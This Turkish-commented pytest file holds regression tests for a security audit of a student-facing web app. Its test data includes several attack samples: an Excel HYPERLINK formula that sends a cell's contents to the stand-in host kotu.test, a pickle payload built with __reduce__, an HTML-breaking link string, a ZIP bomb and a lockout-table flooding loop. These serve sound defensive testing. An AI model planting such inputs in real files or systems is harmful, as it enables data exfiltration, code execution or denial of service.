"""[2026-11-04] Ekran, yük ve siber güvenlik denetiminin kök neden düzeltmeleri.

Her test bir bulguyu tekrar üretir ve düzeltmenin onu kapattığını doğrular (bulgu numaraları PR açıklamasıyla aynı)."""
import base64
import io
import sys
import time
import zipfile
from pathlib import Path

import pytest
from sqlalchemy import text

from tests.conftest import db_gerekli

KOK = Path(__file__).resolve().parents[1]


# ----------------------------------------------------------------------------- kimlik doğrulama
@db_gerekli
def test_yonetim_ilk_sifre_yalnizca_gecici_sifreli_hesapta(istemci, kisiler, db):
    """Eski şifre sormayan uç, şifresini zaten belirlemiş hesapta kullanılamaz (ele geçirilmiş oturum hesabı alamaz)."""
    r = istemci.post("/yonetim/ben/ilk-sifre", json={"yeni_sifre": "YeniSifre123!"}, headers=kisiler["yetkili"])
    assert r.status_code == 400
    assert db.execute(text("SELECT count(*) FROM admin_kullanicilar WHERE sifre_hash <> 'x' AND rol = 'okul_yetkilisi' "
                           "AND email LIKE 'okul_yetkilisi.%@test.invalid'")).scalar() == 0


def test_sifre_dogrula_bozuk_hash_ve_uzun_sifre():
    from fastapi import HTTPException
    from app.core.security import sifre_dogrula, sifre_hashle
    assert sifre_dogrula("herhangi", "x") is False          # önceden ValueError → istek askıda kalıyordu
    assert sifre_dogrula("", "x") is False
    with pytest.raises(HTTPException) as h:
        sifre_hashle("ğ" * 40)                               # 80 bayt: bcrypt 5 ValueError → 500 yerine 400
    assert h.value.status_code == 400
    karma = sifre_hashle("a" * 72)
    assert sifre_dogrula("a" * 72, karma) and sifre_dogrula("a" * 80, karma)   # eski bcrypt'in 72 bayt kesmesiyle uyumlu


def test_hesap_deneme_sayaci_doluluk_kilidi_acmaz():
    from app.core.hiz_siniri import HesapDenemeSayaci
    s = HesapDenemeSayaci(en_fazla=3, pencere=900)
    s.EN_FAZLA_ANAHTAR = 100
    for _ in range(3):
        s.hatali("hedef@okul.test")
    assert s.bekleme("hedef@okul.test") > 0
    for i in range(500):                                    # uydurma e-postalarla tabloyu doldurma saldırısı
        s.hatali(f"sahte{i}@x.test")
    assert s.bekleme("hedef@okul.test") > 0, "kilitli hesap tablo dolunca serbest kalmamalı"
    assert len(s._kayit) <= 4 * s.EN_FAZLA_ANAHTAR


def test_kova_sinirlayici_dolunca_herkesi_sifirlamaz():
    from app.core.hiz_siniri import KovaSinirlayici
    saat = [0.0]
    k = KovaSinirlayici(en_fazla_anahtar=50, saat=lambda: saat[0])
    kural = [(2, 60.0)]
    assert k.dene("saldirgan", kural) == 0 and k.dene("saldirgan", kural) == 0
    assert k.dene("saldirgan", kural) > 0
    for i in range(200):
        saat[0] += 0.001
        k.dene(f"ip{i}", kural)
    assert k.dene("saldirgan", kural) > 0 or len(k._kovalar) < 50


def test_hassas_sifre_uclari_kimlik_kademesinde():
    from app.core.hiz_siniri import kademe_bul
    for yol in ("/yonetim/ben/ilk-sifre", "/ogrenci/profil/sifre-degistir", "/ogrenci/profil/ilk-sifre", "/pipeline-istemci/etkinlestir"):
        assert kademe_bul("POST", yol) == "kimlik", yol


@db_gerekli
def test_iki_adim_gunluk_kod_siniri(db, kisiler, monkeypatch):
    from app.core import hesap_guvenligi_servisi as hg
    monkeypatch.setattr(hg.ep, "eposta_gonder", lambda *a, **k: True)
    monkeypatch.setattr(hg, "KOD_TEKRAR_BEKLEME", hg.timedelta(seconds=0))
    kid = db.execute(text("SELECT id FROM ogrenciler WHERE email LIKE 'ogr.%@test.invalid' ORDER BY olusturulma_zamani DESC LIMIT 1")).scalar()
    for _ in range(hg.GUNLUK_KOD):
        hg.dogrulama_kodu_gonder(db, "ogrenci", kid, "x@test.invalid", "Test", tekrar=True)
    with pytest.raises(hg.BeklemeHatasi):
        hg.dogrulama_kodu_gonder(db, "ogrenci", kid, "x@test.invalid", "Test", tekrar=True)
    db.rollback()


# ----------------------------------------------------------------------------- girdi sınırları
@db_gerekli
def test_istek_metin_siniri(istemci, kisiler):
    r = istemci.put("/ogrenci/profil", json={"ad_soyad": "A" * 100_000}, headers=kisiler["ogrenci"])
    assert r.status_code == 422
    r = istemci.put("/ogrenci/profil", json={"ilgi_alanlari": "x" * 2_000_000}, headers=kisiler["ogrenci"])
    assert r.status_code == 422


def test_tum_istek_modelleri_sinirli():
    """Her istek gövdesi modeli GirdiModeli'nden türer; dosya/görsel alanları açık sınır taşır."""
    from app.main import app
    from app.schemas.girdi import METIN_EN_FAZLA
    s = app.openapi()
    C = s["components"]["schemas"]
    govde = set()

    def topla(o):
        if isinstance(o, dict):
            if "$ref" in o:
                n = o["$ref"].split("/")[-1]
                if n not in govde:
                    govde.add(n)
                    topla(C[n])
            for v in o.values():
                topla(v)
        elif isinstance(o, list):
            for v in o:
                topla(v)
    for yol in s["paths"].values():
        for op in yol.values():
            if "requestBody" in op:
                topla(op["requestBody"])
    import importlib
    import pkgutil
    import app.api
    import app.schemas
    from pydantic import BaseModel
    from app.schemas.girdi import GirdiModeli
    sinirsiz = []
    for pkg in (app.api, app.schemas):
        for mi in pkgutil.iter_modules(pkg.__path__):
            mod = importlib.import_module(f"{pkg.__name__}.{mi.name}")
            for k in vars(mod).values():
                if isinstance(k, type) and issubclass(k, BaseModel) and k.__module__ == mod.__name__:
                    tam = k.__module__.replace(".", "__") + "__" + k.__name__
                    if (k.__name__ in govde or tam in govde) and not issubclass(k, GirdiModeli):
                        sinirsiz.append(tam)
    assert not sinirsiz, f"GirdiModeli'nden türemeyen istek modelleri: {sinirsiz}"
    assert METIN_EN_FAZLA <= 50_000


# ----------------------------------------------------------------------------- dosya / çıktı güvenliği
def _xlsx(sayfa_xml: str, paylasilan: str | None = None) -> str:
    b = io.BytesIO()
    with zipfile.ZipFile(b, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml", '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
                   '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
                   '<Default Extension="xml" ContentType="application/xml"/>'
                   '<Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>'
                   '<Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>'
                   '</Types>')
        z.writestr("_rels/.rels", '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
                   '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/></Relationships>')
        z.writestr("xl/workbook.xml", '<?xml version="1.0"?><workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" '
                   'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"><sheets><sheet name="S" sheetId="1" r:id="rId1"/></sheets></workbook>')
        z.writestr("xl/_rels/workbook.xml.rels", '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
                   '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/></Relationships>')
        z.writestr("xl/worksheets/sheet1.xml", sayfa_xml)
    return base64.b64encode(b.getvalue()).decode()


def test_xlsx_ilan_edilen_genislik_bellek_tuketmez():
    from app.api.okul_yonetimi import _dosyadan_satirlar
    satirlar = "".join(f'<row r="{i}"><c r="A{i}" t="inlineStr"><is><t>ad{i}</t></is></c></row>' for i in range(1, 2001))
    xml = ('<?xml version="1.0"?><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
           f'<dimension ref="A1:XFD2001"/><sheetData>{satirlar}</sheetData></worksheet>')
    t = time.time()
    tablo = _dosyadan_satirlar("x.xlsx", _xlsx(xml))
    assert time.time() - t < 5
    assert len(tablo) == 2000 and all(len(r) == 1 for r in tablo)   # 16.384 sütun değil, gerçek genişlik


def test_xlsx_sikistirma_bombasi_reddedilir():
    from fastapi import HTTPException
    from app.api.okul_yonetimi import _dosyadan_satirlar
    dev = "x" * (90 * 1024 * 1024)
    xml = ('<?xml version="1.0"?><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData>'
           f'<row r="1"><c r="A1" t="inlineStr"><is><t>{dev}</t></is></c></row></sheetData></worksheet>')
    with pytest.raises(HTTPException) as h:
        _dosyadan_satirlar("x.xlsx", _xlsx(xml))
    assert h.value.status_code == 400 and "çok büyük" in h.value.detail


def test_excel_ciktilarinda_formul_calismaz():
    import openpyxl
    from app.core.excel_guvenligi import guvenli_kaydet
    wb = openpyxl.Workbook()
    wb.active["A1"] = '=HYPERLINK("http://kotu.test/?"&B1,"Tikla")'
    wb.active["B1"] = "Ali"
    b = io.BytesIO()
    guvenli_kaydet(wb, b)
    oku = openpyxl.load_workbook(io.BytesIO(b.getvalue()))
    assert oku.active["A1"].data_type == "s"
    assert oku.active["A1"].value.startswith("=HYPERLINK")   # metin aynen görünür, çalışmaz


def test_excel_yazan_her_dosya_guvenli_kaydet_kullanir():
    for yol in (KOK / "app").rglob("*.py"):
        metin = yol.read_text(encoding="utf-8")
        if "Workbook()" in metin:
            assert "wb.save(" not in metin.replace("guvenli_kaydet(wb", ""), f"{yol}: wb.save yerine guvenli_kaydet"


def test_pdf_metni_tirnagi_kacirir():
    from app.core.rapor.pdf import _e
    assert _e('https://a"><b>x') == "https://a&quot;&gt;&lt;b&gt;x"


@db_gerekli
def test_portfolyo_gecersiz_baglanti_reddedilir(istemci, kisiler):
    r = istemci.post("/ogrenci/portfolyo/kayit", json={"tur": "proje", "baslik": "Deneme", "link": 'https://a"><b>x'},
                     headers=kisiler["ogrenci"])
    assert r.status_code in (400, 403, 422)


def test_pipeline_onbellek_pickle_calistirmaz(tmp_path):
    import numpy as np
    sys.path.insert(0, str(KOK / "pipeline" / "src"))
    from guvenli_npy import metin_listesi_kaydet, metin_listesi_oku

    class Kotu:
        def __reduce__(self):
            return (print, ("ÇALIŞTI",))
    np.save(tmp_path / "kotu.npy", np.array([Kotu()], dtype=object))
    with pytest.raises(Exception):
        metin_listesi_oku(tmp_path / "kotu.npy")
    np.save(tmp_path / "eski.npy", np.array(["Mimarlık", "Tıp"], dtype=object))
    assert metin_listesi_oku(tmp_path / "eski.npy") == ["Mimarlık", "Tıp"]
    metin_listesi_kaydet(tmp_path / "yeni.npy", ["a", "ğ"])
    assert np.load(tmp_path / "yeni.npy", allow_pickle=False).tolist() == ["a", "ğ"]
    kaynak = "\n".join(p.read_text(encoding="utf-8") for p in (KOK / "pipeline" / "src").glob("*.py") if p.name != "guvenli_npy.py")
    assert "allow_pickle=True" not in kaynak


@db_gerekli
def test_api_guvenlik_basliklari(istemci, kisiler):
    r = istemci.get("/ogrenci/profil", headers=kisiler["ogrenci"])
    assert r.headers.get("x-content-type-options") == "nosniff"
    assert r.headers.get("x-frame-options") == "DENY"
    assert "frame-ancestors 'none'" in r.headers.get("content-security-policy", "")


def test_vercel_guvenlik_basliklari():
    import json
    v = json.loads((KOK.parent / "frontend" / "vercel.json").read_text(encoding="utf-8"))
    basliklar = {h["key"]: h["value"] for b in v.get("headers", []) for h in b["headers"]}
    assert "frame-ancestors 'none'" in basliklar["Content-Security-Policy"]
    assert basliklar["X-Content-Type-Options"] == "nosniff"
    assert "camera=(self)" in basliklar["Permissions-Policy"]


# ----------------------------------------------------------------------------- ekran / veri tutarlılığı
@db_gerekli
def test_soru_gecerlilik_tablosu_var(istemci, kisiler):
    assert istemci.get("/admin/soru-gecerlilik", headers=kisiler["super"]).status_code == 200


@db_gerekli
def test_sinif_bicimi_tek_tip(db, kisiler):
    from app.core.sema_guncelleme import _komutlar, _sql_oku
    db.execute(text("UPDATE ogrenciler SET sinif = '12-a', sube = NULL WHERE email LIKE 'ogr.%@test.invalid'"))
    for k in _komutlar(_sql_oku("0093_denetim_guvenlik_performans")):
        db.execute(text(k))
    r = db.execute(text("SELECT sinif, sube FROM ogrenciler WHERE email LIKE 'ogr.%@test.invalid' "
                        "ORDER BY olusturulma_zamani DESC LIMIT 1")).one()
    assert (r.sinif, r.sube) == ("12. Sınıf", "A")
    db.rollback()


def test_uyum_cift_yuvarlanmaz():
    """Liste ve karşılaştırma ham uyumu gönderir; ekran tek kez yuvarlar (99,46 → %99, önceden 99,5 → %100)."""
    for yol in ("app/api/listem.py", "app/api/karsilastir.py"):
        metin = (KOK / yol).read_text(encoding="utf-8")
        assert '"toplam_uyum": round(' not in metin, yol


def test_profil_fotografi_ertelenmis():
    from app.models import Ogrenci
    assert Ogrenci.__mapper__.column_attrs["profil_foto_base64"].deferred


def test_kaynakcada_gelistirici_notu_yok():
    import json
    import re
    ham = (KOK / "app" / "data" / "kaynakca.json").read_text(encoding="utf-8")
    json.loads(ham)
    assert not re.search(r"\[20\d\d-\d\d-\d\d\]", ham)
    assert "kosullu_mu=TRUE" not in ham
